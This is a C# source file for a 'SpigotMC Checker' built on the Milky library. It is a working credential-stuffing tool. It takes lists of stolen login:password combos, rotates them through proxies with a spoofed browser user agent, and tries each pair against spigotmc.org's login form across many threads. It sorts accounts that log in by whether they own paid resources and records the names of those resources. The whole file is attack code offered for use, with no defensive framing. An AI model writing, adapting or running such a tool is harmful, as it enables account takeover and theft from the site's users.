using Milky.Objects;
using MilkyNet;
using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;
using static Milky.Output.OutputSettings;

namespace SpigotMC_Checker
{
    class Program
    {
        [STAThread]
        static void Main()
        {
            var Milky = new MilkyManager();
            Milky.ProgramManager.Initialize("SpigotMC Checker", "1.0", "Laiteux", "https://pastebin.com/raw/QW82zeqi");

            Milky.FileUtils.LoadCombos();
            Milky.FileUtils.LoadProxies();

            var threads = Milky.UserUtils.AskInteger("Threads");
            Milky.RunSettings.threads = threads;
            ThreadPool.SetMinThreads(threads, threads);

            Milky.CustomStatistics.AddCustomStatistic("Total Purchased Resources");

            Milky.ConsoleSettings.idleTitleFormat = "%program.name% %program.version% by %program.author%";
            Milky.ConsoleSettings.runningTitleFormat =
                "%program.name% %program.version% by %program.author% – Running | " +
                "Ran: %run.ran% (%run.ran.percentage%) – Remaining: %run.remaining% – Hits: %run.hits% (%run.hits.percentage%) – Free: %run.free% (%run.free.percentage%) – Resources: %custom.Total_Purchased_Resources% | " +
                "RPM: %statistics.rpm% – Elapsed: %statistics.elapsed% – Estimated: %statistics.estimated%";
            Milky.ConsoleSettings.finishedTitleFormat =
                "%program.name% %program.version% by %program.author% – Finished | " +
                "Ran: %run.ran% (%run.ran.percentage%) – Hits: %run.hits% (%run.hits.percentage%) – Free: %run.free% (%run.free.percentage%) – Resources: %custom.Total_Purchased_Resources% | " +
                "Elapsed: %statistics.elapsed%";

            Milky.RunManager.StartRun();

            Parallel.ForEach(Milky.RunLists.combos, new ParallelOptions { MaxDegreeOfParallelism = Milky.RunSettings.threads }, combo =>
            {
                var splittedCombo = combo.Split(':');

                var resultType = ResultType.Unknown;
                var captures = new CaptureDictionary();

                if (splittedCombo.Length == 2)
                {
                    var login = splittedCombo[0];
                    var password = splittedCombo[1];

                    while (resultType == ResultType.Unknown)
                    {
                        var request = Milky.RequestUtils.SetProxy(new MilkyRequest()
                        {
                            Cookies = new CookieDictionary(),
                            UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
                        });

                        try
                        {
                            var indexResponse = Milky.RequestUtils.Execute(request, HttpMethod.GET, "https://www.spigotmc.org");

                            if (indexResponse.ContainsCookie("xf_session"))
                            {
                                while (resultType == ResultType.Unknown) // In case we get a proxy issue, it won't restart the whole process
                                {
                                    try
                                    {
                                        request.AddHeader("Content-Type", "application/x-www-form-urlencoded");

                                        var loginResponse = Milky.RequestUtils.Execute(request,
                                            HttpMethod.POST, "https://www.spigotmc.org/login/login",
                                            $"login={Uri.EscapeDataString(login)}&password={Uri.EscapeDataString(password)}");
                                        var loginSource = loginResponse.ToString();

                                        if (loginSource.Contains("Signed in as"))
                                        {
                                            while (resultType == ResultType.Unknown) // It would not be smart to make it login again, knowing the account works
                                            {
                                                try
                                                {
                                                    var purchasedResourcesResponse = Milky.RequestUtils.Execute(request, HttpMethod.GET, "https://www.spigotmc.org/resources/purchased");
                                                    var purchasedResourcesSource = purchasedResourcesResponse.ToString();

                                                    if(purchasedResourcesSource.Contains("<h1>Purchased Resources</h1>"))
                                                    {
                                                        resultType = ResultType.Hit;

                                                        var purchasedResources = new Regex("<h3 class=\"title\">\\n<a href=\".*?\">(.*?)<").Matches(purchasedResourcesSource);
                                                        captures.Add($"Purchased Resources ({purchasedResources.Count})", string.Join(" / ", from Match purchasedResource in purchasedResources select purchasedResource.Groups[1].Value));

                                                        Milky.CustomStatistics.IncrementCustomStatistic("Total Purchased Resources", purchasedResources.Count);
                                                    }
                                                    else if(purchasedResourcesSource.Contains("You have not purchased any resources."))
                                                    {
                                                        resultType = ResultType.Free;
                                                    }
                                                }
                                                catch { }
                                            }
                                        }
                                        else if (
                                            loginSource.Contains("' could not be found.") ||
                                            loginSource.Contains("Incorrect password. Please try again.") ||
                                            loginSource.Contains("Two-Step Verification Required") ||
                                            loginSource.Contains("Your account has temporarily been locked due to failed login attempts."))
                                        {
                                            resultType = ResultType.Invalid;
                                        }
                                    }
                                    catch { }
                                }
                            }
                        }
                        catch { }

                        request.Dispose();
                    }
                }

                Milky.RunManager.SubmitComboResult(combo, resultType, captures);
            });

            Milky.RunManager.FinishRun();

            Thread.Sleep(-1);
        }
    }
}
